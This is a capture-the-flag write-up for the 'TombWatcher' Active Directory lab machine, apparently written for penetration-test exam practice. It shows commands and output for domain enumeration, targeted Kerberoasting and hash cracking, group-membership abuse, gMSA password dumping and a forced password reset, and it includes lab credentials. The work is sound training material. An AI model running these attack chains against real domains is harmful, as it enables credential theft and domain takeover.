
+++
title = "TombWatcher-CPTS-Prep-Box Writeup"
date = 2026-02-19T00:00:00Z
draft = false
description = "TombWatcher is a Windows machine focusing on ACL abuse chains, targeted Kerberoasting, GMSA password reading, Shadow Credentials, and AD CS exploitation through deleted object restoration (ESC15)"
tags = ["CPTS", "HTB", "TombWatcher", "CPTS Prep", "Active Directory", "ACL Abuse", "GMSA", "Shadow Credentials", "ESC15", "AD CS"]
+++

## Executive Summary

During November 2025, a simulated penetration test was conducted against the Windows domain "tombwatcher.htb" (`10.129.232.167`). The assessment began from an assumed breach scenario, providing the tester with low-privileged credentials for the domain user `henry`. The objective was to evaluate the potential impact of a compromised end-user account and identify escalation paths to full domain compromise.

The test successfully demonstrated a complete attack chain, moving from initial low-privileged access to domain administrator privileges by exploiting a complex chain of ACL misconfigurations and AD CS vulnerabilities. The following key findings were identified:

- **Initial Enumeration:** The provided credentials for `henry` were validated against SMB, LDAP, and WinRM services, revealing a standard domain user with limited access.

- **Targeted Kerberoasting:** Through ACL analysis, it was discovered that `henry` had `WriteSPN` privileges over the user `alfred`. This was abused to perform a targeted Kerberoasting attack, successfully cracking the password `<REDACTED>`.

- **Group Membership Manipulation:** The user `alfred` had the ability to add themselves to the `Infrastructure` group, which possessed `ReadGMSAPassword` rights over the `ansible_dev$` account.

- **GMSA Password Extraction:** The `ansible_dev$` GMSA account password was read and converted to its NT hash, enabling authentication as the machine account.

- **Password Reset Chain:** The `ansible_dev$` account had `ForceChangePassword` privileges over the user `sam`, allowing a password reset to gain control of that account.

- **Shadow Credentials Attack:** Through a series of ACL manipulations (`WriteOwner` → `GenericAll`), the user `john` was targeted with a Shadow Credentials attack, obtaining their NT hash and WinRM access.

- **Deleted Object Restoration:** During enumeration, a deleted user `cert_admin` was discovered in the tombstone. Using `GenericAll` privileges over the ADCS OU, the account was restored.

- **AD CS Exploitation (ESC15):** The restored `cert_admin` account had enrollment rights on the `WebServer` template, which was vulnerable to ESC15 (CVE-2024-49019). This was exploited to request a certificate for the `Administrator` account, ultimately obtaining the Domain Admin NT hash.

**Impact:**  
This chain of exploits resulted in complete compromise of the Active Directory domain. An attacker starting with a standard user account was able to navigate a complex web of ACL relationships and AD CS misconfigurations to achieve domain administrator privileges.

**Recommendations:**

- **Review and Harden ACLs:** Conduct a thorough review of all ACLs within Active Directory, removing overly permissive rights such as `WriteSPN`, `ForceChangePassword`, and `GenericAll` from non-privileged users and groups.
- **Secure GMSA Accounts:** Restrict `ReadGMSAPassword` rights to only necessary service accounts and monitor for unauthorized access.
- **Monitor Deleted Objects:** Implement monitoring for tombstone restoration events, which can indicate attempts to revive deleted privileged accounts.
- **Patch AD CS:** Apply security patches for CVE-2024-49019 (ESC15) and review certificate templates for schema version 1 with enrollee-supplied subjects.
- **Implement Tiering Model:** Separate administrative functions from standard user accounts to prevent lateral movement through ACL abuse.

## Machine Information

As is common in real-life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry` / `H3nry_987TGV!`

## About

TombWatcher is a Windows machine that focuses on Active Directory ACL abuse chains. Starting from a low-privileged user, the attacker must navigate through multiple privilege escalation paths including targeted Kerberoasting, group membership manipulation, GMSA password reading, and Shadow Credentials. The final step involves restoring a deleted certificate administrator account and exploiting an ESC15 vulnerability in AD CS to obtain domain administrator privileges.

## Detailed Walkthrough

### Phase 1: Initial Access and Network Reconnaissance

**1. Credential Validation**  
The provided credentials for the user `henry` were validated against the domain controller to confirm access and enumerate available services.

```bash 
❯ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --shares
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB         10.129.232.167  445    DC01             [*] Enumerated shares
SMB         10.129.232.167  445    DC01             Share           Permissions     Remark
SMB         10.129.232.167  445    DC01             -----           -----------     ------
SMB         10.129.232.167  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.167  445    DC01             C$                              Default share
SMB         10.129.232.167  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.167  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.167  445    DC01             SYSVOL          READ            Logon server share

 /home/h/HTB/C/To/03-Attack-Chains   
```

**Findings:** The credentials were valid. SMB shares including `NETLOGON` and `SYSVOL` were accessible with read permissions, but WinRM access was denied.

**2. RID Brute Forcing**  
To enumerate domain users, a RID brute force attack was performed using the authenticated SMB session.
```bash
❯ nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --rid-brute
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
SMB         10.129.232.167  445    DC01             498: TOMBWATCHER\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.167  445    DC01             500: TOMBWATCHER\Administrator (SidTypeUser)
SMB         10.129.232.167  445    DC01             501: TOMBWATCHER\Guest (SidTypeUser)
SMB         10.129.232.167  445    DC01             502: TOMBWATCHER\krbtgt (SidTypeUser)
SMB         10.129.232.167  445    DC01             512: TOMBWATCHER\Domain Admins (SidTypeGroup)
SMB         10.129.232.167  445    DC01             513: TOMBWATCHER\Domain Users (SidTypeGroup)
SMB         10.129.232.167  445    DC01             514: TOMBWATCHER\Domain Guests (SidTypeGroup)
SMB         10.129.232.167  445    DC01             515: TOMBWATCHER\Domain Computers (SidTypeGroup)
SMB         10.129.232.167  445    DC01             516: TOMBWATCHER\Domain Controllers (SidTypeGroup)
SMB         10.129.232.167  445    DC01             517: TOMBWATCHER\Cert Publishers (SidTypeAlias)
SMB         10.129.232.167  445    DC01             518: TOMBWATCHER\Schema Admins (SidTypeGroup)
SMB         10.129.232.167  445    DC01             519: TOMBWATCHER\Enterprise Admins (SidTypeGroup)
SMB         10.129.232.167  445    DC01             520: TOMBWATCHER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.232.167  445    DC01             521: TOMBWATCHER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.232.167  445    DC01             522: TOMBWATCHER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.232.167  445    DC01             525: TOMBWATCHER\Protected Users (SidTypeGroup)
SMB         10.129.232.167  445    DC01             526: TOMBWATCHER\Key Admins (SidTypeGroup)
SMB         10.129.232.167  445    DC01             527: TOMBWATCHER\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.232.167  445    DC01             553: TOMBWATCHER\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.232.167  445    DC01             571: TOMBWATCHER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.167  445    DC01             572: TOMBWATCHER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.232.167  445    DC01             1000: TOMBWATCHER\DC01$ (SidTypeUser)
SMB         10.129.232.167  445    DC01             1101: TOMBWATCHER\DnsAdmins (SidTypeAlias)
SMB         10.129.232.167  445    DC01             1102: TOMBWATCHER\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.232.167  445    DC01             1103: TOMBWATCHER\Henry (SidTypeUser)
SMB         10.129.232.167  445    DC01             1104: TOMBWATCHER\Alfred (SidTypeUser)
SMB         10.129.232.167  445    DC01             1105: TOMBWATCHER\sam (SidTypeUser)
SMB         10.129.232.167  445    DC01             1106: TOMBWATCHER\john (SidTypeUser)
SMB         10.129.232.167  445    DC01             1107: TOMBWATCHER\Infrastructure (SidTypeGroup)
SMB         10.129.232.167  445    DC01             1108: TOMBWATCHER\ansible_dev$ (SidTypeUser)

 /home/h/HTB/C/To/03-Attack-Chains   
```

```bash 
nxc smb 10.129.232.167 -u henry -p 'H3nry_987TGV!' --rid-brute  | sed -n 's/.*\\\([^()]*\).*/\1/p' > users.txt

Henry 
Alfred 
sam 
john 
Infrastructure 
ansible_dev$ 
Administrator 

```
**Findings:** The enumeration revealed several domain users: `Henry`, `Alfred`, `sam`, `john`, and a machine account `ansible_dev$`.

**3. Comprehensive Enumeration with enum4linux-ng**  
Further enumeration was performed using enum4linux-ng to gather detailed domain information.
```bash

❯ enum4linux-ng -A -u henry -p 'H3nry_987TGV!' 10.129.232.167

ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.232.167
[*] Username ......... 'henry'
[*] Random Username .. 'ljwjnhfw'
[*] Password ......... 'H3nry_987TGV!'
[*] Timeout .......... 5 second(s)

 =======================================
|    Listener Scan on 10.129.232.167    |
 =======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 ======================================================
|    Domain Information via LDAP for 10.129.232.167    |
 ======================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: tombwatcher.htb

 =============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.232.167    |
 =============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ===========================================
|    SMB Dialect Check on 10.129.232.167    |
 ===========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 =============================================================
|    Domain Information via SMB session for 10.129.232.167    |
 =============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC01
NetBIOS domain name: TOMBWATCHER
DNS domain: tombwatcher.htb
FQDN: DC01.tombwatcher.htb
Derived membership: domain member
Derived domain: TOMBWATCHER

 ===========================================
|    RPC Session Check on 10.129.232.167    |
 ===========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for user session
[+] Server allows session using username 'henry', password 'H3nry_987TGV!'
[*] Check for random user
[-] Could not establish random user session: STATUS_LOGON_FAILURE

 =====================================================
|    Domain Information via RPC for 10.129.232.167    |
 =====================================================
[+] Domain: TOMBWATCHER
[+] Domain SID: S-1-5-21-1392491010-1358638721-2126982587
[+] Membership: domain member

 =================================================
|    OS Information via RPC for 10.129.232.167    |
 =================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Wk Sv PDC Tim NT

 =======================================
|    Users via RPC on 10.129.232.167    |
 =======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 7 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 7 user(s) via 'enumdomusers'
[+] After merging user results we have 7 user(s) total:
'1103':
  username: Henry
  name: (null)
  acb: '0x00000210'
  description: (null)
'1104':
  username: Alfred
  name: (null)
  acb: '0x00000210'
  description: (null)
'1105':
  username: sam
  name: (null)
  acb: '0x00000210'
  description: (null)
'1106':
  username: john
  name: (null)
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000215'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00000011'
  description: Key Distribution Center Service Account

 ========================================
|    Groups via RPC on 10.129.232.167    |
 ========================================
[*] Enumerating local groups
[+] Found 5 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 28 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 16 group(s) via 'enumdomgroups'
[+] After merging groups results we have 49 group(s) total:
'1101':
  groupname: DnsAdmins
  type: local
'1102':
  groupname: DnsUpdateProxy
  type: domain
'1107':
  groupname: Infrastructure
  type: domain
'498':
  groupname: Enterprise Read-only Domain Controllers
  type: domain
'512':
  groupname: Domain Admins
  type: domain
'513':
  groupname: Domain Users
  type: domain
'514':
  groupname: Domain Guests
  type: domain
'515':
  groupname: Domain Computers
  type: domain
'516':
  groupname: Domain Controllers
  type: domain
'517':
  groupname: Cert Publishers
  type: local
'518':
  groupname: Schema Admins
  type: domain
'519':
  groupname: Enterprise Admins
  type: domain
'520':
  groupname: Group Policy Creator Owners
  type: domain
'521':
  groupname: Read-only Domain Controllers
  type: domain
'522':
  groupname: Cloneable Domain Controllers
  type: domain
'525':
  groupname: Protected Users
  type: domain
'526':
  groupname: Key Admins
  type: domain
'527':
  groupname: Enterprise Key Admins
  type: domain
'544':
  groupname: Administrators
  type: builtin
'545':
  groupname: Users
  type: builtin
'546':
  groupname: Guests
  type: builtin
'548':
  groupname: Account Operators
  type: builtin
'549':
  groupname: Server Operators
  type: builtin
'550':
  groupname: Print Operators
  type: builtin
'551':
  groupname: Backup Operators
  type: builtin
'552':
  groupname: Replicator
  type: builtin
'553':
  groupname: RAS and IAS Servers
  type: local
'554':
  groupname: Pre-Windows 2000 Compatible Access
  type: builtin
'555':
  groupname: Remote Desktop Users
  type: builtin
'556':
  groupname: Network Configuration Operators
  type: builtin
'557':
  groupname: Incoming Forest Trust Builders
  type: builtin
'558':
  groupname: Performance Monitor Users
  type: builtin
'559':
  groupname: Performance Log Users
  type: builtin
'560':
  groupname: Windows Authorization Access Group
  type: builtin
'561':
  groupname: Terminal Server License Servers
  type: builtin
'562':
  groupname: Distributed COM Users
  type: builtin
'568':
  groupname: IIS_IUSRS
  type: builtin
'569':
  groupname: Cryptographic Operators
  type: builtin
'571':
  groupname: Allowed RODC Password Replication Group
  type: local
'572':
  groupname: Denied RODC Password Replication Group
  type: local
'573':
  groupname: Event Log Readers
  type: builtin
'574':
  groupname: Certificate Service DCOM Access
  type: builtin
'575':
  groupname: RDS Remote Access Servers
  type: builtin
'576':
  groupname: RDS Endpoint Servers
  type: builtin
'577':
  groupname: RDS Management Servers
  type: builtin
'578':
  groupname: Hyper-V Administrators
  type: builtin
'579':
  groupname: Access Control Assistance Operators
  type: builtin
'580':
  groupname: Remote Management Users
  type: builtin
'582':
  groupname: Storage Replica Administrators
  type: builtin

 ========================================
|    Shares via RPC on 10.129.232.167    |
 ========================================
[*] Enumerating shares
[+] Found 5 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[-] Could not check share: timed out

 ===========================================
|    Policies via RPC for 10.129.232.167    |
 ===========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 1
  Maximum password age: not set
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set

 ===========================================
|    Printers via RPC for 10.129.232.167    |
 ===========================================
[+] No printers available

Completed after 68.20 seconds

 /home/h/HTB/CPTS-Prep/TombWatcher/03-Attack-Chains   
```
**Findings:** The tool confirmed domain information, user lists, group memberships, and password policies. The domain functional level was Windows Server 2016.


**4. LDAP and Group Enumeration**  
LDAP queries were performed to identify group structures and potential privilege escalation paths.
```bash 
ldapsearch -x -H ldap://10.129.232.167 -s base
❯ ldapsearch -x -H ldap://10.129.232.167 -s base
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#

#
dn:
domainFunctionality: 7
forestFunctionality: 7
domainControllerFunctionality: 7
rootDomainNamingContext: DC=tombwatcher,DC=htb
ldapServiceName: tombwatcher.htb:dc01$@TOMBWATCHER.HTB
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxDirSyncDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedControl: 1.2.840.113556.1.4.2309
supportedControl: 1.2.840.113556.1.4.2330
supportedControl: 1.2.840.113556.1.4.2354
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=tombwatcher,DC=h
 tb
serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur
 ation,DC=tombwatcher,DC=htb
schemaNamingContext: CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
namingContexts: DC=tombwatcher,DC=htb
namingContexts: CN=Configuration,DC=tombwatcher,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
namingContexts: DC=DomainDnsZones,DC=tombwatcher,DC=htb
namingContexts: DC=ForestDnsZones,DC=tombwatcher,DC=htb
isSynchronized: TRUE
highestCommittedUSN: 98769
dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,
 CN=Sites,CN=Configuration,DC=tombwatcher,DC=htb
dnsHostName: DC01.tombwatcher.htb
defaultNamingContext: DC=tombwatcher,DC=htb
currentTime: 20251120131003.0Z
configurationNamingContext: CN=Configuration,DC=tombwatcher,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

 /home/h/HTB/C/To/03-Attack-Chains   
```
**Findings:** Password policy was weak with minimum length 1 and no complexity requirements. Group enumeration provided a baseline for ACL analysis.

### Phase 2: ACL Analysis and Targeted Kerberoasting

**5. ACL Enumeration**  
BloodHound or manual ACL analysis would reveal that `henry` has `WriteSPN` privileges over the user `alfred`.

**6. Targeted Kerberoasting**  
The `WriteSPN` privilege was abused using targetedKerberoast.py to set a Service Principal Name on `alfred` and request a TGS ticket.

```bash
❯ ./targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$cbebe947c71e98b5c594ac08a6487968$f2546f5c59bebaf123d6cf9c559cf7acfb6fcaa2abb910636271b18cd52
<REDACTED> 20056497806aae143912735b027b6795013e0b0d315b3a0bb4b0b46d2b2336b1068c4ee49247a2387962949afad6f75e71b480873537989fc2901f25bd1698edd2d
[VERBOSE] SPN removed successfully for (Alfred)

```

**Findings:** A Kerberos TGS hash was obtained for the user `alfred`.

**7. Hash Cracking**  
The captured TGS hash was cracked using hashcat with the rockyou wordlist.

```bash
❯ vim krb5tgs_Alfred_hash.txt
❯ hashcat krb5tgs_Alfred_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 7435HS, 6851/13767 MB (2048 MB allocatable), 16MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$cbebe947c71e98b5<REDACTED>
281ee0eb24c6d03ea29940e81c63358384abbb12d115ecaed5ab48182e0eceb24392ad1f570d20056497806aae143912735b027b6795013e0b0d315b3a0bb4b0b46d2b2336b1068c4ee49247a2387962949afad6f75e71b480873537989fc2901f25bd1698edd2d:<REDACTED>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...8edd2d
Time.Started.....: Thu Nov 20 21:19:31 2025 (0 secs)
Time.Estimated...: Thu Nov 20 21:19:31 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4685.3 kH/s (1.95ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> cocoliso
Hardware.Mon.#1..: Temp: 59c Util: 10%

Started: Thu Nov 20 21:19:29 2025
Stopped: Thu Nov 20 21:19:33 2025

 /home/h/HTB/C/To/03-Attack-Chains    
```

**Findings:** The password for `alfred` was successfully cracked: `<REDACTED>`.

### Phase 3: Lateral Movement to Alfred

**8. Credential Validation for Alfred**  
The newly obtained credentials were validated against the domain controller.

```bash 
❯ nxc smb 10.129.232.167 -u alfred -p <REDACTED>
SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\alfred:<REDACTED>

```
**Findings:** The credentials were valid for the user `alfred`.

**9. ACL Analysis for Alfred**  
Further ACL analysis revealed that `alfred` had the ability to add themselves to the `Infrastructure` group.

**10. Group Membership Manipulation**  
Using bloodyAD, `alfred` was added to the `Infrastructure` group.
```bash
bloodyAD -u alfred -p '<REDACTED>' -d tombwatcher.htb --host dc01.tombwatcher.htb add groupMember 'INFRASTRUCTURE' alfred

❯ bloodyAD -u alfred -p '<REDACTED>' -d tombwatcher.htb --host dc01.tombwatcher.htb add groupMember 'INFRASTRUCTURE' alfred
[+] alfred added to INFRASTRUCTURE

❯ bloodyAD -u alfred -p '<REDACTED>' -d tombwatcher.htb --host dc01.tombwatcher.htb add groupMember 'INFRASTRUCTURE' alfred
[+] alfred added to INFRASTRUCTURE

```

**Findings:** `alfred` successfully joined the `Infrastructure` group, which had `ReadGMSAPassword` rights over the `ansible_dev$` account.

### Phase 4: GMSA Password Extraction

**11. GMSA Password Reading**  
The `ReadGMSAPassword` privilege was abused using gMSADumper.py to extract the password for `ansible_dev$`.
```bash 
❯ python3 /opt/gMSADumper/gMSADumper.py -u alfred -p <REDACTED> -d tombwatcher.htb
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::<REDACTED>
ansible_dev$:aes256-cts-hmac-sha1-96:aa7df5cfa4812182382e302de4e327aa4ac5a8a1d8b2ef0186f947fff6eec0e8
ansible_dev$:aes128-cts-hmac-sha1-96:<REDACTED>

 /home/h/HTB/C/To/03-Attack-Chains     
```

**Findings:** The NT hash for `ansible_dev$` was obtained: `<REDACTED>`.

**12. Credential Validation for Ansible_dev$**  
The extracted hash was validated against the domain controller.

```bash
❯ nxc smb 10.129.232.167 -u ansible_dev$ -H <REDACTED>

SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\ansible_dev$:<REDACTED>
❯ nxc ldap 10.129.232.167 -u ansible_dev$ -H <REDACTED>

LDAP        10.129.232.167  389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb) (signing:None) (channel binding:Never)
LDAP        10.129.232.167  389    DC01             [+] tombwatcher.htb\ansible_dev$:<REDACTED>
❯ nxc winrm 10.129.232.167 -u ansible_dev$ -H <REDACTED>

WINRM       10.129.232.167  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
WINRM       10.129.232.167  5985   DC01             [-] tombwatcher.htb\ansible_dev$:<REDACTED>

```
**Findings:** The hash was valid for the `ansible_dev$` machine account.

### Phase 5: Password Reset Chain

**13. ACL Analysis for Ansible_dev$**  
ACL analysis revealed that `ansible_dev$` had `ForceChangePassword` privileges over the user `sam`.

**14. Password Reset**  
Using bloodyAD, the password for `sam` was forcibly changed.

```bash 
❯ bloodyAD -u ansible_dev$ -p 'ffffffffffffffffffffffffffffffff:<REDACTED>' -d tombwatcher.htb --host 10.129.232.167 set password 'Sam' 'NewPassword2025!'

[+] Password changed successfully!

 /home/h/HTB/C/To/03-Attack-Chains  
 
```

**Findings:** The password for `sam` was successfully changed to `NewPassword2025!`.


**15. Credential Validation for Sam**  
The new password was validated against the domain controller.
```bash
 ❯ nxc smb 10.129.232.167 -u 'sam' -p 'NewPassword2025!'

SMB         10.129.232.167  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.167  445    DC01             [+] tombwatcher.htb\sam:NewPassword2025!
```

**Findings:** The credentials were valid for the user `sam`.

